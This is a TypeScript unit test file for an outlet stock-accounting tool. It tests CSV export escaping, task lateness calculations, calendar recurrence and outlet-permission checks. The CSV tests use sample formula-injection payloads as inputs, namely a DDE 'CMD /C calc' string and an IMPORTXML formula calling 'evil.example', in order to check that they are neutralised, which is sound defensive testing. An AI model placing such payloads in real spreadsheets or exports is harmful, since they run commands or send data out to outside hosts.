import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  DEFAULT_ROLE_CONFIGS,
  STOCK_ACCOUNTING_OUTLETS,
  STOCK_ACCOUNTING_TASKS,
  buildMonthWorkingDays,
  buildOutletsByPicMap,
  calcRecap,
  calcTask,
  canAccountEditPic,
  escapeCsv,
  expandCalendarEventsForRange,
  generateDailyFleetCsv,
} from '../src/utils/outletLogic';
import {
  AccountProfile,
  CalendarEvent,
  OutletStoreState,
  TaskDefinition,
} from '../src/types/outlet';

describe('outletLogic: escapeCsv (CSV Formula Injection & formatting)', () => {
  it('prefixes formula-trigger characters with a single quote', () => {
    assert.equal(escapeCsv('=CMD|" /C calc"!A0'), `"'=CMD|"" /C calc""!A0"`);
    assert.equal(escapeCsv('=1+1'), "'=1+1");
    assert.equal(escapeCsv('+SUM(A1:A2)'), "'+SUM(A1:A2)");
    assert.equal(escapeCsv('-cmd'), "'-cmd");
    assert.equal(escapeCsv('@SUM(1,2)'), `"'@SUM(1,2)"`);
    assert.equal(escapeCsv('   =1+1'), "'   =1+1");
    assert.equal(escapeCsv('\t=HYPERLINK("http://x")'), "\"'\t=HYPERLINK(\"\"http://x\"\")\"");
  });

  it('preserves plain positive/negative numbers without quoting prefix', () => {
    assert.equal(escapeCsv(0), '0');
    assert.equal(escapeCsv(-2), '-2');
    assert.equal(escapeCsv(3), '3');
    assert.equal(escapeCsv('-5'), '-5');
    assert.equal(escapeCsv('+1.5'), '+1.5');
  });

  it('neutralizes formula injection inside generated daily CSV export', () => {
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          '2026-11-10|ham': {
            d: '2026-11-09',
            n: '=IMPORTXML("http://evil.example")',
            ts: '2026-11-10T03:00:00.000Z',
          },
        },
      },
      visit: {},
    };
    const days = buildMonthWorkingDays('2026-11');
    const csv = generateDailyFleetCsv(
      state,
      days,
      DEFAULT_ROLE_CONFIGS.stock_accounting,
      '2026-11-10',
      '2026-11-10',
      true
    );
    assert.ok(csv.includes("'=IMPORTXML"));
  });
});

describe('outletLogic: calcTask & calcRecap', () => {
  it('calculates daily_plus_1, ref_task, and memo_month accurately on target working day', () => {
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          '2026-11-10|memo': { d: '2026-10', n: '', ts: '2026-11-10T02:00:00.000Z' },
          '2026-11-10|ham': { d: '2026-11-09', n: 'Lancar', ts: '2026-11-10T02:00:00.000Z' },
          '2026-11-10|bm': { d: '2026-11-09', n: '', ts: '2026-11-10T02:00:00.000Z' },
        },
      },
      visit: {},
    };

    // Memo: 2026-10 vs anchor 2026-11 + tol(1) = -1 + 1 = 0 -> UPDATE
    const memoRes = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-10', 'memo', '2026-11-10');
    assert.equal(memoRes.pm, 0);
    assert.equal(memoRes.pend, false);

    // HAM SPC: 2026-11-09 vs 2026-11-10 (-1 working day) + tol(1) = 0 -> UPDATE
    const hamRes = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-10', 'ham', '2026-11-10');
    assert.equal(hamRes.pm, 0);
    assert.equal(hamRes.pend, false);

    // Barang Masuk (ref_task -> ham, tol=0): 2026-11-09 vs ref 2026-11-09 = 0 -> UPDATE
    const bmRes = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-10', 'bm', '2026-11-10');
    assert.equal(bmRes.pm, 0);
    assert.equal(bmRes.pend, false);
  });

  it('supports weekly_plus_1 tasks using Monday-based ISO week arithmetic', () => {
    const weeklyTask: TaskDefinition = {
      key: 'wk_audit',
      label: 'Audit Mingguan',
      shortLabel: 'Audit Wk',
      defaultDate: '',
      inputType: 'week',
      formulaType: 'weekly_plus_1',
      toleranceOffset: 1,
      formulaNote: 'Selisih minggu terhadap tanggal kerja + 1',
    };
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          // Work date Tue 2026-11-10 (week of 2026-11-09), filled with prev week 2026-11-02 -> -1 + 1 = 0 (UPDATE)
          '2026-11-10|wk_audit': { d: '2026-11-02', n: '', ts: '2026-11-10T03:00:00.000Z' },
          // Work date Tue 2026-11-17 (week of 2026-11-16), still inherited 2026-11-02 -> -2 + 1 = -1 (PENDING)
        },
      },
      visit: {},
    };

    const onWeekOk = calcTask(state, days, [weeklyTask], 'NKPM', '2026-11-10', 'wk_audit', '2026-11-17');
    assert.equal(onWeekOk.pm, 0);
    assert.equal(onWeekOk.pend, false);

    const nextWeekLate = calcTask(state, days, [weeklyTask], 'NKPM', '2026-11-17', 'wk_audit', '2026-11-17');
    assert.equal(nextWeekLate.pm, -1);
    assert.equal(nextWeekLate.pend, true);
    assert.equal(nextWeekLate.source, 'inherited');
    assert.equal(nextWeekLate.sourceDay, '2026-11-10');
  });

  it('carries over previous month entry into the next month', () => {
    const decDays = buildMonthWorkingDays('2026-12');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        DELICA: {
          '2026-11-30|ham': { d: '2026-11-30', n: '', ts: '2026-11-30T04:00:00.000Z' },
        },
      },
      visit: {},
    };
    const res = calcTask(state, decDays, STOCK_ACCOUNTING_TASKS, 'DELICA', '2026-12-01', 'ham', '2026-12-01');
    assert.equal(res.d, '2026-11-30');
    assert.equal(res.source, 'inherited');
    assert.equal(res.sourceDay, '2026-11-30');
    assert.equal(res.pm, 0);
    assert.equal(res.pend, false);
  });

  it('clamps future update dates to today and penalizes non-admin backfill', () => {
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          // Filled for 2026-11-05 on 2026-11-10 WIB (2026-11-10T04:00Z = 11:00 WIB) -> 4 working days gap - 1 = 3 backfillDays
          '2026-11-05|ham': { d: '2026-11-05', n: '', ts: '2026-11-10T04:00:00.000Z' },
          // Admin backfill should NOT be penalized
          '2026-11-05|jual': { d: '2026-11-28', n: '', ts: '2026-11-10T04:00:00.000Z', byAdmin: true },
        },
      },
      visit: {},
    };

    const userBackfill = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-05', 'ham', '2026-11-10');
    assert.equal(userBackfill.backfillDays, 3);
    assert.equal(userBackfill.pm, -3);
    assert.equal(userBackfill.pend, true);

    const adminClamped = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-05', 'jual', '2026-11-10');
    assert.equal(adminClamped.backfillDays, undefined);
    // Clamped to today (2026-11-10) vs day (2026-11-05) = +4 working days + tol(1) = +5
    assert.equal(adminClamped.pm, 5);
    assert.equal(adminClamped.pend, false);
  });

  it('computes calcRecap across a date range excluding Sundays', () => {
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        DLS: {
          '2026-11-02|ham': { d: '2026-11-02', n: '', ts: '2026-11-02T03:00:00.000Z' },
          '2026-11-03|ham': { d: '2026-11-02', n: '', ts: '2026-11-03T03:00:00.000Z' },
          '2026-11-04|ham': { d: '2026-11-02', n: '', ts: '2026-11-04T03:00:00.000Z' },
        },
      },
      visit: {},
    };
    const recap = calcRecap(
      state,
      days,
      STOCK_ACCOUNTING_TASKS,
      'DLS',
      'PETER',
      'ham',
      '2026-11-05',
      '2026-11-05',
      '2026-11-02'
    );
    // Day 2: pm=+1, Day 3: pm=0, Day 4: pm=-1, Day 5 (inherited Nov 02): pm=-2 => sum=-2, avg=-0.5, pend=2
    assert.equal(recap.pend, 2);
    assert.equal(recap.avg, -0.5);
    assert.equal(recap.latestPm, -2);
    assert.equal(recap.latestPend, true);
    assert.equal(recap.hasAnyInput, true);
  });
});

describe('outletLogic: expandCalendarEventsForRange', () => {
  const baseEvt: CalendarEvent = {
    id: 'evt1',
    date: '2026-11-02',
    startTime: '09:00',
    title: 'Briefing Operasional',
    notes: '',
    visibleTo: ['stock_accounting', 'gl', 'accounting'],
    createdBy: 'u1',
    updatedBy: 'u1',
    createdByName: 'Admin',
    createdByEmail: 'admin@example.com',
    repeatFreq: 'none',
    repeatInterval: 1,
    repeatWeekdays: [],
    repeatUntil: '',
    excludedDates: [],
  };

  it('expands weekly events with repeatWeekdays, repeatUntil, and excludedDates', () => {
    const evt: CalendarEvent = {
      ...baseEvt,
      repeatFreq: 'weekly',
      repeatInterval: 1,
      repeatWeekdays: [1, 3], // Mon & Wed
      repeatUntil: '2026-11-11',
      excludedDates: ['2026-11-04'],
    };
    const occurrences = expandCalendarEventsForRange([evt], '2026-11-01', '2026-11-30');
    assert.deepEqual(
      occurrences.map((o) => o.occurrenceDate),
      ['2026-11-02', '2026-11-09', '2026-11-11']
    );
    assert.ok(occurrences.every((o) => o.isRecurring));
  });

  it('clamps monthly recurrence day-of-month for shorter months (e.g. Feb)', () => {
    const evt: CalendarEvent = {
      ...baseEvt,
      date: '2026-01-31',
      repeatFreq: 'monthly',
      repeatInterval: 1,
    };
    const occurrences = expandCalendarEventsForRange([evt], '2026-01-01', '2026-03-31');
    assert.deepEqual(
      occurrences.map((o) => o.occurrenceDate),
      ['2026-01-31', '2026-02-28', '2026-03-31']
    );
  });
});

describe('outletLogic: PIC ownership & permission helpers', () => {
  it('restricts non-admin accounts to their assigned PIC outlets only', () => {
    const peterAccount: Pick<AccountProfile, 'role' | 'picName' | 'name'> = {
      role: 'stock_accounting',
      picName: 'PETER',
      name: 'Peter',
    };
    const adminAccount: Pick<AccountProfile, 'role' | 'picName' | 'name'> = {
      role: 'admin',
      picName: '',
      name: 'Admin',
    };

    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'PETER'), true);
    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'peter'), true);
    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'MELVIN'), false);
    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'CHARLES'), false);
    assert.equal(canAccountEditPic(adminAccount, STOCK_ACCOUNTING_OUTLETS, 'MELVIN'), true);

    const byPic = buildOutletsByPicMap(STOCK_ACCOUNTING_OUTLETS);
    assert.deepEqual(byPic.PETER, ['NKPM', 'DELICA', 'DLS', 'NUANSA']);
    assert.equal(byPic.MELVIN.includes('NKPM'), false);
  });
});
